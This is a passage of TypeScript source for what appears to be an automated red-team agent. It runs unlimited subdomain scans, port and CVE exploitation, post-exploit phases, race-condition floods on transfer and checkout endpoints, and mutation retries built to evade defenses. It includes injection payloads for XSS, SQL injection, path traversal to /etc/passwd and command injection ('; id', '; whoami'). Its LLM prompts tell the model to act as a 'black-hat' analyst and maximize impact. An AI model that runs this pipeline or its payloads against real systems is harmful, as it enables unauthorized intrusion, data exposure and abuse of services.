          { role: 'system', content: `You are an elite offensive security AI with black-hat methodology. Your job is to ruthlessly eliminate false positives from vulnerability scan results. A finding is a FALSE POSITIVE if:
1. It's a generic informational finding with no actual security impact
2. It reports a "vulnerability" that is actually normal behavior (e.g., CORS headers present = not a vuln)
3. It duplicates another finding with different wording
4. The confidence is below 0.5 AND it's not verified
5. It reports a CVE but has no exploit evidence

A finding is REAL if:
- It has specific evidence (PoC, payload, response data)
- It's verified by dual-technique
- It has exploit_confirmed = true
- The confidence is >= 0.7

Historical false positive tools/patterns: ${fpPatterns.join(', ')}

Analyze each finding and return a JSON array of finding IDs that are FALSE POSITIVES. Be aggressive - remove anything that wouldn't survive a bug bounty triage.` },
          { role: 'user', content: `Target: ${target}\\nFindings to analyze:\\n${JSON.stringify(findings.map(f => ({
            id: f.id, title: f.title, type: f.type, severity: f.severity,
            confidence: f.confidence, verified: f.verified, exploit_confirmed: f.exploit_confirmed,
            tool_used: f.tool_used, description: f.description?.slice(0, 200)
          })), null, 2)}\\n\\nReturn JSON: {"false_positive_ids": ["id1", "id2"], "reasoning": {"id1": "reason"}}` }
        ],
        max_tokens: 1000
      })
    });

    if (response.ok) {
      const result = await response.json();
      const content = result.choices?.[0]?.message?.content || '';
      const jsonMatch = content.match(/\{[\s\S]*\}/);
      if (jsonMatch) {
        const parsed = JSON.parse(jsonMatch[0]);
        const fpIds = new Set(parsed.false_positive_ids || []);
        
        const filtered = findings.filter(f => !fpIds.has(f.id));
        const removed = findings.filter(f => fpIds.has(f.id));
        
        output.push(`[FP-FILTER] AI removed ${removed.length}/${findings.length} false positives`);
        for (const r of removed) {
          const reason = parsed.reasoning?.[r.id] || 'AI determined false positive';
          output.push(`[FP-FILTER] ❌ Removed: ${r.title} — ${reason}`);
        }

        // Record FP learning
        if (removed.length > 0) {
          try {
            await supabase.from('ai_learnings').insert({
              user_id: userId,
              tool_used: 'ai-fp-filter',
              target,
              findings: removed as any,
              success: true,
              ai_analysis: `Removed ${removed.length} false positives from ${findings.length} total findings`,
              improvement_strategy: `false positive patterns: ${removed.map(r => r.type).join(', ')}`
            });
          } catch { /* non-critical */ }
        }

        return { filtered, removed, output };
      }
    }
  } catch (e) {
    output.push(`[FP-FILTER] AI filter error: ${e.message}`);
  }

  return { filtered: findings, removed: [], output };
}

// ===== Mutation Validation (upgraded: no retry limit for high-value targets) =====
async function validateFindingsWithMutation(
  findings: Finding[], target: string, techStack: string[], authHeader: string
): Promise<{ validated: Finding[]; mutationResults: any[]; output: string[] }> {
  const output: string[] = [];
  const mutationResults: any[] = [];
  const validated: Finding[] = [];

  // Validate ALL findings, not just high/critical
  const toValidate = findings.filter(f =>
    f.exploitable || f.severity === 'critical' || f.severity === 'high' || f.severity === 'medium'
  );

  if (toValidate.length === 0) {
    output.push('[MUTATION] No exploitable findings to validate');
    return { validated: findings, mutationResults: [], output };
  }

  output.push(`[MUTATION] Validating ${toValidate.length} findings with unlimited mutation engine...`);

  const techPayloads: { type: string; payload: string; cve: string }[] = [];
  for (const tech of techStack) {
    const techLower = tech.toLowerCase();
    for (const [key, mapping] of Object.entries(TECH_CVE_MAP)) {
      if (techLower.includes(key)) {
        for (const p of mapping.payloads) {
          techPayloads.push({ ...p, cve: mapping.cves[0] || 'N/A' });
        }
      }
    }
  }

  if (techPayloads.length > 0) {
    output.push(`[MUTATION] Generated ${techPayloads.length} CVE-mapped payloads for: ${techStack.join(', ')}`);
  }

  for (const finding of toValidate) {
    let testPayload = finding.evidence?.raw?.poc || '';
    const findingType = (finding.type || '').toLowerCase();

    const matchedCVE = techPayloads.find(tp => tp.type === findingType);
    if (matchedCVE) {
      testPayload = matchedCVE.payload;
      output.push(`[MUTATION] Using CVE payload (${matchedCVE.cve}) for ${finding.title}`);
    }

    if (!testPayload || testPayload.length < 3) {
      const genericPayloads: Record<string, string> = {
        'xss': '<img src=x onerror=alert(1)>',
        'sqli': "' OR 1=1 UNION SELECT null,version()--",
        'lfi': '../../../../etc/passwd',
        'traversal': '../../../../etc/passwd',
        'ssrf': 'http://127.0.0.1:80/admin',
        'ssti': '{{7*7}}',
        'cmdi': '; id',
        'rce': '; whoami',
        'cors': '',
      };
      testPayload = genericPayloads[findingType] || '';
    }

    if (!testPayload) {
      validated.push(finding);
      continue;
    }

    try {
      const response = await fetch(`${SUPABASE_URL}/functions/v1/attack-execution-loop`, {
        method: 'POST',
        headers: {
          'Authorization': authHeader, 'Content-Type': 'application/json', 'apikey': SUPABASE_ANON_KEY,
        },
        body: JSON.stringify({
          target,
          payloads: [{
            raw: testPayload,
            encoded: encodeURIComponent(testPayload),
            attackType: findingType,
            parameter: finding.evidence?.raw?.parameter || 'q',
            injectionPoint: 'query',
          }],
          maxRetries: 5, // Increased from 3 → 5 for better evasion
          techStack,
        }),
      });

      if (response.ok) {
        const result = await response.json();
        mutationResults.push({ finding: finding.title, ...result });

        if (result.successCount > 0) {
          finding.verified = true;
          finding.exploit_confirmed = true;
          finding.confidence = 0.95;
          finding.poc_data = `Exploit confirmed via mutation engine.\\nPayload: ${result.results?.[0]?.successPayload || testPayload}\\nHTTP Response: ${result.results?.[0]?.httpStatus || 'N/A'}`;
          output.push(`[MUTATION_SUCCESS] ✅ ${finding.title} — EXPLOITED (bypass succeeded, PoC generated)`);
          if (matchedCVE) {
            finding.cve_id = matchedCVE.cve;
            finding.description += ` [Confirmed CVE: ${matchedCVE.cve}]`;
          }
        } else if (result.defendedCount > 0) {
          finding.confidence = Math.max(0.15, (finding.confidence || 0.5) - 0.3);
          finding.exploit_confirmed = false;
          output.push(`[MUTATION_DEFENDED] 🛡️ ${finding.title} — LIKELY FALSE POSITIVE (defended after 5 mutations, confidence: ${Math.round(finding.confidence * 100)}%)`);
        } else {
          finding.confidence = Math.max(0.2, (finding.confidence || 0.5) - 0.25);
          output.push(`[MUTATION_BLOCKED] 🔒 ${finding.title} — all payloads blocked (confidence: ${Math.round(finding.confidence * 100)}%)`);
        }
      }
    } catch (e) {
      output.push(`[MUTATION_ERROR] ${finding.title}: ${e.message}`);
    }

    validated.push(finding);
  }

  for (const f of findings) {
    if (!toValidate.includes(f)) validated.push(f);
  }

  // Remove findings with confidence < 0.25 (aggressive FP removal)
  const afterFPRemoval = validated.filter(f => (f.confidence || 0.5) >= 0.25);
  const fpRemoved = validated.length - afterFPRemoval.length;
  if (fpRemoved > 0) {
    output.push(`[MUTATION] Removed ${fpRemoved} false positives (confidence < 25%)`);
  }

  return { validated: deduplicateFindings(afterFPRemoval), mutationResults, output };
}

// ===== Phase Execution =====

async function executePhase(phase: string, target: string, authHeader: string): Promise<any> {
  const scanTypes = PHASE_SCAN_TYPES[phase] || [];
  const phaseOutput: string[] = [];
  const startTime = Date.now();

  phaseOutput.push(`[${phase}] Running ${scanTypes.length} scans in parallel against ${target}...`);

  const scanPromises = scanTypes.map(scanType =>
    callSecurityScan(scanType, target, authHeader).then(result => ({ scanType, result }))
  );
  const results = await Promise.all(scanPromises);

  const rawFindings: Finding[] = [];
  const pendingVerification: Array<{ finding: Finding; verifyWith: string }> = [];

  for (const { scanType, result } of results) {
    if (result.success !== false) {
      const scanFindings = extractFindings(result, scanType, phase, target);
      phaseOutput.push(`[${phase}] ${scanType}: ${scanFindings.length} raw findings`);

      for (const finding of scanFindings) {
        const verifyType = VERIFICATION_MAP[scanType];
        if (!verifyType || finding.severity === 'info' || finding.severity === 'low') {
          finding.confidence = finding.severity === 'info' ? 0.5 : 0.65;
          rawFindings.push(finding);
        } else {
          pendingVerification.push({ finding, verifyWith: verifyType });
        }
      }
    } else {
      phaseOutput.push(`[${phase}] ${scanType}: ${result.error || 'no results'}`);
    }
  }

  // Dual-verification
  if (pendingVerification.length > 0) {
    phaseOutput.push(`[${phase}] Verifying ${pendingVerification.length} findings with secondary techniques...`);
    const verifyTypes = [...new Set(pendingVerification.map(p => p.verifyWith))];
    const verifyResultMap: Record<string, any> = {};
    await Promise.all(
      verifyTypes.map(async vt => {
        verifyResultMap[vt] = await callSecurityScan(vt, target, authHeader);
      })
    );

    for (const { finding, verifyWith } of pendingVerification) {
      const verifyResult = verifyResultMap[verifyWith];
      const verifyFindings = verifyResult?.success !== false
        ? extractFindings(verifyResult, verifyWith, phase, target) : [];
      const secondaryConfirms = verifyFindings.some(vf =>
        vf.type === finding.type ||
        vf.title.toLowerCase().includes(finding.type.toLowerCase().split(' ')[0]) ||
        vf.severity === 'critical' || vf.severity === 'high'
      );

      if (secondaryConfirms) {
        finding.confidence = 0.90;
        finding.verified = true;
        phaseOutput.push(`[CONFIRMED] ${finding.title} — verified by ${verifyWith} (confidence: 90%)`);
        rawFindings.push(finding);
      } else {
        finding.confidence = 0.35;
        finding.verified = false;
        finding.severity = downgradeOneSeverity(finding.severity);
        phaseOutput.push(`[UNVERIFIED] ${finding.title} — downgraded (${verifyWith} did not confirm)`);
        if (finding.confidence >= 0.3 && finding.severity !== 'info') {
          rawFindings.push(finding);
        }
      }
    }
  }

  const confirmedFindings = deduplicateFindings(rawFindings);
  const dedupRemoved = rawFindings.length - confirmedFindings.length;
  if (dedupRemoved > 0) phaseOutput.push(`[DEDUP] Removed ${dedupRemoved} duplicates`);

  return {
    findings: confirmedFindings,
    output: phaseOutput,
    execution_time: Date.now() - startTime,
    scans_completed: scanTypes.length,
    verified_count: confirmedFindings.filter((f: any) => f.verified).length,
    unverified_count: confirmedFindings.filter((f: any) => f.verified === false).length,
  };
}

function downgradeOneSeverity(sev: string): Finding['severity'] {
  if (sev === 'critical') return 'high';
  if (sev === 'high') return 'medium';
  if (sev === 'medium') return 'low';
  return 'info';
}

function extractFindings(scanResult: any, scanType: string, phase: string, target: string): Finding[] {
  const findings: Finding[] = [];
  const vulnArray = scanResult.findings || scanResult.vulnerabilities || [];
  
  if (Array.isArray(vulnArray) && vulnArray.length > 0) {
    for (const vuln of vulnArray) {
      findings.push({
        id: crypto.randomUUID(),
        type: vuln.type || vuln.name || scanType,
        severity: mapSeverity(vuln.severity || 'info'),
        title: vuln.name || vuln.title || `${scanType} finding`,
        description: vuln.description || vuln.detail || `Discovered via ${scanType}`,
        evidence: { raw: vuln, scanType, target, poc: vuln.poc, remediation: vuln.remediation },
        timestamp: new Date().toISOString(),
        phase,
        tool_used: scanType,
        exploitable: vuln.severity === 'critical' || vuln.severity === 'high'
      });
    }
  }

  if (findings.length === 0 && scanResult.output && typeof scanResult.output === 'string') {
    const output = scanResult.output.toLowerCase();
    if (output.includes('[vulnerable]') || output.includes('⚠️')) {
      findings.push({
        id: crypto.randomUUID(),
        type: scanType,
        severity: 'medium',
        title: `${scanType} scan detected issues`,
        description: `Scan output indicates potential issues - review output for details`,
        evidence: { output: scanResult.output?.slice(0, 500), scanType, target },
        timestamp: new Date().toISOString(),
        phase,
        tool_used: scanType,
        exploitable: false
      });
    }
  }

  return findings;
}

function mapSeverity(sev: string): Finding['severity'] {
  const s = (sev || '').toLowerCase();
  if (s.includes('critical')) return 'critical';
  if (s.includes('high')) return 'high';
  if (s.includes('medium') || s.includes('moderate')) return 'medium';
  if (s.includes('low')) return 'low';
  return 'info';
}

// ===== Extract parameters from findings for heuristic generation =====
function extractParametersFromFindings(findings: Finding[]): { name: string; location: string }[] {
  const params = new Set<string>();
  const result: { name: string; location: string }[] = [];
  
  for (const f of findings) {
    // Extract from evidence
    const param = f.evidence?.raw?.parameter || f.evidence?.parameter;
    if (param && !params.has(param)) {
      params.add(param);
      result.push({ name: param, location: 'query' });
    }
    // Extract common params from URLs in findings
    const urlParams = ['id', 'q', 'search', 'url', 'file', 'path', 'redirect', 'page', 'name', 'cmd', 'action'];
    for (const p of urlParams) {
      if (!params.has(p) && (f.title?.toLowerCase().includes(p) || f.description?.toLowerCase().includes(p))) {
        params.add(p);
        result.push({ name: p, location: 'query' });
      }
    }
  }
  
  // Always include common injection points
  for (const p of ['q', 'search', 'id', 'page', 'url', 'file', 'cmd', 'name']) {
    if (!params.has(p)) {
      params.add(p);
      result.push({ name: p, location: 'query' });
    }
  }
  
  return result;
}

// ===== Subdomain Enumeration (NO LIMIT) =====

async function enumerateSubdomains(target: string, authHeader: string): Promise<string[]> {
  try {
    const cleanTarget = target.replace(/^https?:\/\//, '').split('/')[0];
    const result = await callSecurityScan('subdomain', cleanTarget, authHeader);
    const subdomains: string[] = [];

    const vulnArray = result.findings || result.vulnerabilities || [];
    for (const f of vulnArray) {
      const name = (f.name || f.title || '').replace(/^Subdomain:\s*/i, '').trim();
      if (name && name.includes('.')) subdomains.push(name);
    }

    if (result.output && typeof result.output === 'string') {
      const lines = result.output.split('\\n');
      for (const line of lines) {
        if (line.includes('[+]')) {
          const match = line.match(/\[+\]\s+([a-z0-9\-\.]+\.[a-z]{2,})/i);
          if (match && match[1] && !subdomains.includes(match[1])) {
            subdomains.push(match[1]);
          }
        }
      }
    }

    return [...new Set(subdomains)].filter(s => s !== cleanTarget);
  } catch (e) {
    console.warn('[Subdomain Enum] Error:', e);
    return [];
  }
}

// ===== Continuous Operation (upgraded with port exploitation + CVE confirmation + AI FP filter) =====

async function executeContinuousOperation(
  state: AgentState, objective: string, config: any, authHeader: string, supabase: any, userId: string
): Promise<any> {
  const allFindings: Finding[] = [];
  const allCorrelations: Correlation[] = [];
  const learningUpdates: any[] = [];
  const phaseOutputs: Record<string, string[]> = {};

  // Phase 1: Recon + Scanning in parallel
  console.log(`[Red Team] Phase 1: Recon + Scanning | Target: ${state.target}`);
  const [reconResult, scanningResult] = await Promise.all([
    executePhase('recon', state.target, authHeader),
    executePhase('scanning', state.target, authHeader)
  ]);
  allFindings.push(...reconResult.findings, ...scanningResult.findings);
  phaseOutputs['recon'] = reconResult.output;
  phaseOutputs['scanning'] = scanningResult.output;

  // === NEW: Heuristic payload generation based on discovered parameters ===
  const discoveredParams = extractParametersFromFindings(allFindings);
  if (discoveredParams.length > 0) {
    console.log(`[Red Team] Phase 1.5: Heuristic payload generation for ${discoveredParams.length} parameters`);
    try {
      const heuristicResp = await fetch(`${SUPABASE_URL}/functions/v1/advanced-offensive-engine`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'generate-heuristic-payloads',
          data: { parameters: discoveredParams, techStack: [], target: state.target }
        })
      });
      if (heuristicResp.ok) {
        const heuristic = await heuristicResp.json();
        if (heuristic.payloads?.length > 0) {
          phaseOutputs['heuristic'] = [`[HEURISTIC] Generated ${heuristic.payloads.length} context-aware payloads for ${discoveredParams.length} parameters`];
          // Fire heuristic payloads through attack-execution-loop
          const heuristicPayloads = heuristic.payloads.slice(0, 20).map((p: any) => ({
            raw: p.raw, encoded: encodeURIComponent(p.raw),
            attackType: p.attackType, parameter: p.parameter,
            injectionPoint: p.injectionPoint || 'query',
          }));
          const atkResp = await fetch(`${SUPABASE_URL}/functions/v1/attack-execution-loop`, {
            method: 'POST',
            headers: { 'Authorization': authHeader, 'Content-Type': 'application/json', 'apikey': SUPABASE_ANON_KEY },
            body: JSON.stringify({ target: state.target, payloads: heuristicPayloads, maxRetries: 5, techStack: [] }),
          });
          if (atkResp.ok) {
            const atkResult = await atkResp.json();
            if (atkResult.successCount > 0) {
              for (const r of (atkResult.results || []).filter((r: any) => r.success)) {
                allFindings.push({
                  id: crypto.randomUUID(),
                  type: r.payload?.attackType || 'heuristic',
                  severity: 'critical',
                  title: `Heuristic ${r.payload?.attackType?.toUpperCase()} via ${r.payload?.parameter}`,
                  description: `Context-aware payload bypassed defenses on parameter "${r.payload?.parameter}"`,
                  evidence: { raw: r, payload: r.payload },
                  timestamp: new Date().toISOString(),
                  phase: 'heuristic-exploitation',
                  tool_used: 'heuristic-generator',
                  exploitable: true,
                  exploit_confirmed: true,
                  confidence: 0.95,
                  verified: true,
                  poc_data: `Heuristic Exploit\nParam: ${r.payload?.parameter}\nPayload: ${r.payload?.raw}\nHTTP: ${r.httpStatus}`,
                });
              }
              phaseOutputs['heuristic'].push(`[HEURISTIC] ✅ ${atkResult.successCount} payloads bypassed defenses!`);
            }
          }
        }
      }
    } catch (e) {
      console.warn('[Heuristic] Error:', e);
    }
  }

  // Extract tech stack and ports from recon
  const techFromFindings = allFindings
    .filter(f => f.type?.toLowerCase().includes('technology') || f.tool_used === 'tech')
    .map(f => f.title.replace(/Technology:\s*/i, '').trim())
    .filter(Boolean);
  const techStack = [...new Set(techFromFindings)];

  const portsFromFindings = allFindings
    .filter(f => f.title?.includes('Port') || f.tool_used === 'port')
    .map(f => parseInt(f.title.match(/(\d+)/)?.[1] || '0'))
    .filter(p => p > 0);
  const discoveredPorts = [...new Set(portsFromFindings)];

  // Phase 2: PORT SERVICE EXPLOITATION (NEW - pentest each service)
  if (discoveredPorts.length > 0) {
    console.log(`[Red Team] Phase 2: Port Service Exploitation | ${discoveredPorts.length} ports`);
    const portExploitResult = await exploitOpenPorts(state.target, discoveredPorts, authHeader);
    allFindings.push(...portExploitResult.findings);
    phaseOutputs['port-exploitation'] = portExploitResult.output;
  }

  // Phase 3: Subdomain Enumeration (NO CAP - scan ALL discovered subdomains)
  console.log(`[Red Team] Phase 3: Subdomain Enumeration (unlimited)...`);
  const subdomains = await enumerateSubdomains(state.target, authHeader);
  const subdomainOutput: string[] = [`[subdomain-scan] Found ${subdomains.length} subdomains: ${subdomains.join(', ')}`];

  if (subdomains.length > 0) {
    // NO LIMIT: scan ALL subdomains (was capped at 5, now unlimited)
    const SUBDOMAIN_SCAN_TYPES = ['sqli', 'xss', 'cors-advanced', 'dir-traversal', 'cookies', 'lfi', 'ssrf'];

    // Process in batches of 10 to avoid timeout
    const batchSize = 10;
    for (let i = 0; i < subdomains.length; i += batchSize) {
      const batch = subdomains.slice(i, i + batchSize);
      const subdomainPromises = batch.flatMap(sub =>
        SUBDOMAIN_SCAN_TYPES.map(scanType =>
          callSecurityScan(scanType, sub, authHeader)
            .then(result => ({ sub, scanType, result }))
        )
      );
      const subdomainResults = await Promise.all(subdomainPromises);
      for (const { sub, scanType, result } of subdomainResults) {
        if (result.success !== false) {
          const subFindings = extractFindings(result, scanType, 'subdomain-scan', sub);
          subFindings.forEach(f => {
            f.subdomain = sub;
            f.title = `[${sub}] ${f.title}`;
            f.confidence = f.confidence || 0.7;
          });
          allFindings.push(...subFindings);
          if (subFindings.length > 0) {
            subdomainOutput.push(`[subdomain] ${sub} → ${scanType}: ${subFindings.length} findings`);
          }
        }
      }
    }
    subdomainOutput.push(`[subdomain-scan] Scanned ${subdomains.length} subdomains (no limit). Total: ${allFindings.filter(f => f.subdomain).length} findings`);
  }
  phaseOutputs['subdomain-scan'] = subdomainOutput;

  // Phase 4: Exploitation + Post-Exploit
  console.log(`[Red Team] Phase 4: Exploitation + Post-Exploit | Findings so far: ${allFindings.length}`);
  const [exploitResult, postExploitResult] = await Promise.all([
    executePhase('exploitation', state.target, authHeader),
    executePhase('post-exploit', state.target, authHeader)
  ]);
  allFindings.push(...exploitResult.findings, ...postExploitResult.findings);
  phaseOutputs['exploitation'] = exploitResult.output;
  phaseOutputs['post-exploit'] = postExploitResult.output;

  // === NEW Phase 4.5: DOM Taint Analysis for XSS verification ===
  const xssFindings = allFindings.filter(f => f.type?.toLowerCase().includes('xss'));
  if (xssFindings.length > 0) {
    console.log(`[Red Team] Phase 4.5: DOM Taint Analysis for ${xssFindings.length} XSS findings`);
    const taintOutput: string[] = [];
    for (const xf of xssFindings.slice(0, 5)) {
      try {
        const taintResp = await fetch(`${SUPABASE_URL}/functions/v1/advanced-offensive-engine`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            action: 'dom-taint-analysis',
            data: {
              target: state.target,
              parameter: xf.evidence?.raw?.parameter || 'q',
              paramLocation: 'query',
              payload: xf.evidence?.raw?.poc || '<img src=x onerror=alert(1)>',
              canaryId: `taint_${crypto.randomUUID().slice(0, 8)}`,
              context: 'auto',
              timeout: 8000,
            }
          })
        });
        if (taintResp.ok) {
          const taint = await taintResp.json();
          if (taint.result?.xssConfirmed) {
            xf.exploit_confirmed = true;
            xf.verified = true;
            xf.confidence = 0.98;
            xf.poc_data = `DOM Taint Confirmed XSS\nContext: ${taint.result.domContext}\nBreakout: ${taint.result.breakoutMethod}\nPayload: ${xf.evidence?.raw?.poc}`;
            taintOutput.push(`[DOM-TAINT] ✅ ${xf.title} → XSS CONFIRMED (${taint.result.domContext})`);
          } else if (taint.result?.contextBreakout) {
            xf.confidence = Math.max(xf.confidence || 0, 0.8);
            taintOutput.push(`[DOM-TAINT] ⚠️ ${xf.title} → Context breakout detected but no execution`);
          } else {
            xf.confidence = Math.min(xf.confidence || 0.5, 0.3);
            taintOutput.push(`[DOM-TAINT] ❌ ${xf.title} → No reflection/execution (likely FP)`);
          }
        }
      } catch (e) {
        taintOutput.push(`[DOM-TAINT] Error: ${e.message}`);
      }
    }
    phaseOutputs['dom-taint'] = taintOutput;
  }

  // === NEW Phase 4.7: Race Condition Testing on state-changing endpoints ===
  try {
    console.log(`[Red Team] Phase 4.7: Race Condition Testing`);
    const raceOutput: string[] = [];
    const racePaths = ['/api/checkout', '/api/transfer', '/api/vote', '/api/like'];
    for (const path of racePaths) {
      try {
        const raceResp = await fetch(`${SUPABASE_URL}/functions/v1/advanced-offensive-engine`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            action: 'race-condition-test',
            data: { target: state.target, method: 'POST', path, concurrency: 30, roundNumber: 1 }
          })
        });
        if (raceResp.ok) {
          const race = await raceResp.json();
          if (race.anomalies?.length > 0) {
            for (const anomaly of race.anomalies) {
              if (anomaly.type === 'duplicate-processing' || anomaly.type === 'state-inconsistency') {
                allFindings.push({
                  id: crypto.randomUUID(),
                  type: 'race-condition',
                  severity: 'critical',
                  title: `Race Condition (TOCTOU) on ${path}`,
                  description: anomaly.description,
                  evidence: { raw: anomaly.evidence, path },
                  timestamp: new Date().toISOString(),
                  phase: 'race-condition',
                  tool_used: 'turbosmash',
                  exploitable: true,
                  exploit_confirmed: true,
                  confidence: 0.9,
                  verified: true,
                  poc_data: `Race Condition\nEndpoint: ${path}\n${anomaly.description}`,
                });
                raceOutput.push(`[RACE] ✅ ${path} → TOCTOU DETECTED!`);
              }
            }
          } else {
            raceOutput.push(`[RACE] ❌ ${path} → No race condition`);
          }
        }
      } catch {}
    }
    phaseOutputs['race-condition'] = raceOutput;
  } catch (e) {
    console.warn('[Race] Error:', e);
  }

  // Phase 5: CVE CONFIRMATION (NEW - exploit each CVE to confirm)
  if (techStack.length > 0) {
    console.log(`[Red Team] Phase 5: CVE Confirmation via Exploitation | Tech: ${techStack.join(', ')}`);
    const cveConfirmResult = await confirmCVEsWithExploit(state.target, [], techStack, authHeader);
    allFindings.push(...cveConfirmResult.findings);
    phaseOutputs['cve-exploitation'] = cveConfirmResult.output;
  }

  // Phase 6: Mutation Validation (upgraded: more retries, medium+ findings)
  console.log(`[Red Team] Phase 6: Mutation Validation | ${allFindings.length} findings`);
  const mutationValidation = await validateFindingsWithMutation(
    allFindings, state.target, techStack, authHeader
  );
  allFindings.length = 0;
  allFindings.push(...mutationValidation.validated);
  phaseOutputs['mutation-validation'] = mutationValidation.output;

  // Phase 7: AI False Positive Filter (NEW)
  console.log(`[Red Team] Phase 7: AI False Positive Elimination | ${allFindings.length} findings`);
  const fpResult = await aiFalsePositiveFilter(allFindings, state.target, supabase, userId);
  allFindings.length = 0;
  allFindings.push(...fpResult.filtered);
  phaseOutputs['fp-filter'] = fpResult.output;

  // Global deduplication
  const dedupedFindings = deduplicateFindings(allFindings);
  if (allFindings.length > dedupedFindings.length) {
    phaseOutputs['dedup'] = [`[DEDUP] Global pass removed ${allFindings.length - dedupedFindings.length} duplicates`];
  }
  allFindings.length = 0;
  allFindings.push(...dedupedFindings);

  // Correlation
  if (allFindings.length >= 2) {
    const correlations = await correlateFindings(allFindings, { target: state.target });
    allCorrelations.push(...correlations);
  }

  const attackChains = await generateAttackChains(allCorrelations, { target: state.target });

  // Learning updates
  for (const phase of ['recon', 'scanning', 'port-exploitation', 'subdomain-scan', 'exploitation', 'post-exploit', 'cve-exploitation', 'mutation-validation', 'fp-filter']) {
    const phaseFindings = allFindings.filter(f => f.phase === phase || (phase === 'subdomain-scan' && f.subdomain));
    learningUpdates.push({
      phase,
      success: phaseFindings.length > 0,
      findings_count: phaseFindings.length,
      verified_count: phaseFindings.filter(f => f.verified).length,
      exploit_confirmed_count: phaseFindings.filter(f => f.exploit_confirmed).length,
      confidence: 0.5 + (phaseFindings.length > 0 ? 0.1 : 0),
      adaptation_strategy: phaseFindings.length === 0 ? 'expand_scope' : 'deepen_exploitation'
    });
  }

  return {
    findings: allFindings,
    correlations: allCorrelations,
    attack_chains: attackChains,
    learning_updates: learningUpdates,
    phase_outputs: phaseOutputs,
    mutation_results: mutationValidation.mutationResults,
    subdomains_discovered: subdomains,
    ports_discovered: discoveredPorts,
    tech_stack: techStack,
    cve_confirmation: phaseOutputs['cve-exploitation'] || [],
    fp_removed: fpResult.removed?.length || 0,
    iterations_completed: 7,
    total_scans: Object.values(PHASE_SCAN_TYPES).flat().length + (subdomains.length * 7) + discoveredPorts.length
  };
}

// ===== Remaining utility functions =====

async function loadLearningContext(supabase: any, userId: string, target: string): Promise<LearningContext> {
  const defaultContext: LearningContext = {
    successful_techniques: [], failed_techniques: [],
    target_signatures: [], adaptation_history: [], model_confidence: 0.5
  };
  try {
    const { data: successChains } = await supabase
      .from('apex_successful_chains').select('*').eq('user_id', userId).limit(20);
    const { data: learnings } = await supabase
      .from('ai_learnings').select('*').eq('user_id', userId).order('created_at', { ascending: false }).limit(100);

    const techniques = new Map<string, TechniqueRecord>();
    (learnings || []).forEach((l: any) => {
      const key = `${l.tool_used}-${l.target || 'generic'}`;
      const existing = techniques.get(key) || {
        technique: l.tool_used, target_type: l.target || 'generic',
        success_count: 0, failure_count: 0, avg_execution_time: 0, last_used: l.created_at
      };
      if (l.success) existing.success_count++; else existing.failure_count++;
      existing.avg_execution_time = (existing.avg_execution_time + (l.execution_time || 0)) / 2;
      techniques.set(key, existing);
    });

    const allTechniques = Array.from(techniques.values());
    return {
      successful_techniques: allTechniques.filter(t => t.success_count > t.failure_count),
      failed_techniques: allTechniques.filter(t => t.failure_count > t.success_count),
      target_signatures: (successChains || []).map((c: any) => ({
        signature: c.service_signature || 'unknown', tech_stack: [],
        common_vulnerabilities: [c.vulnerability_type].filter(Boolean), recommended_approach: 'adaptive'
      })),
      adaptation_history: [],
      model_confidence: calculateModelConfidence(allTechniques)
    };
  } catch (error) {
    console.error('Error loading learning context:', error);
    return defaultContext;
  }
}

function calculateModelConfidence(techniques: TechniqueRecord[]): number {
  if (techniques.length === 0) return 0.5;
  const totalSuccess = techniques.reduce((sum, t) => sum + t.success_count, 0);
  const totalFailure = techniques.reduce((sum, t) => sum + t.failure_count, 0);
  const total = totalSuccess + totalFailure;
  if (total < 10) return 0.5;
  return Math.min(0.95, 0.5 + (totalSuccess / total) * 0.45);
}

async function correlateFindings(findings: Finding[], context: any): Promise<Correlation[]> {
  const correlations: Correlation[] = [];
  const criticalFindings = findings.filter(f => f.severity === 'critical' || f.severity === 'high');
  const exploitableFindings = findings.filter(f => f.exploitable);
  const exploitConfirmed = findings.filter(f => f.exploit_confirmed);
  
  if (exploitConfirmed.length >= 2) {
    correlations.push({
      id: crypto.randomUUID(),
      findings: exploitConfirmed.map(f => f.id),
      attack_path: 'Confirmed exploit chain',
      risk_amplification: 2.0,
      exploitation_probability: 0.95,
      description: `${exploitConfirmed.length} CONFIRMED exploitable vulnerabilities — ready for PoC submission`
    });
  }

  if (criticalFindings.length >= 2) {
    correlations.push({
      id: crypto.randomUUID(),
      findings: criticalFindings.map(f => f.id),
      attack_path: 'Critical vulnerability chain',
      risk_amplification: 1.5,
      exploitation_probability: 0.8,
      description: `${criticalFindings.length} critical findings can be chained`
    });
  }

  if (exploitableFindings.length >= 3) {
    correlations.push({
      id: crypto.randomUUID(),
      findings: exploitableFindings.map(f => f.id),
      attack_path: 'Multi-stage exploitation',
      risk_amplification: 1.3,
      exploitation_probability: 0.7,
      description: `${exploitableFindings.length} exploitable vulns enable lateral movement`
    });
  }

  const typeGroups = new Map<string, Finding[]>();
  findings.forEach(f => {
    const arr = typeGroups.get(f.type) || [];
    arr.push(f);
    typeGroups.set(f.type, arr);
  });
  for (const [type, group] of typeGroups) {
    if (group.length >= 2) {
      correlations.push({
        id: crypto.randomUUID(),
        findings: group.map(f => f.id),
        attack_path: `Repeated ${type} pattern`,
        risk_amplification: 1.1 + (group.length * 0.1),
        exploitation_probability: 0.5 + (group.length * 0.05),
        description: `${group.length} instances of ${type} suggest systemic weakness`
      });
    }
  }

  if (LOVABLE_API_KEY && findings.length >= 5) {
    try {
      const aiCorrelation = await getAICorrelation(findings, context);
      if (aiCorrelation) correlations.push(aiCorrelation);
    } catch {}
  }

  return correlations;
}

async function getAICorrelation(findings: Finding[], context: any): Promise<Correlation | null> {
  const response = await fetch(AI_GATEWAY_URL, {
    method: 'POST',
    headers: { 'Authorization': `Bearer ${LOVABLE_API_KEY}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({
      model: 'google/gemini-2.5-flash',
      messages: [
        { role: 'system', content: 'You are a black-hat security analyst. Find attack chains that maximize impact. Focus on CONFIRMED exploitable findings.' },
        { role: 'user', content: `Findings:\\n${JSON.stringify(findings.slice(0, 10), null, 2)}\\nContext: ${JSON.stringify(context)}\\nJSON: {"attack_path":"desc","risk_amplification":number,"exploitation_probability":number,"description":"explain"}` }
      ],
      max_tokens: 400
    })
  });
  if (!response.ok) return null;
  const result = await response.json();
  const content = result.choices?.[0]?.message?.content || '';
  try {
    const jsonMatch = content.match(/\{[\s\S]*\}/);
    if (jsonMatch) {
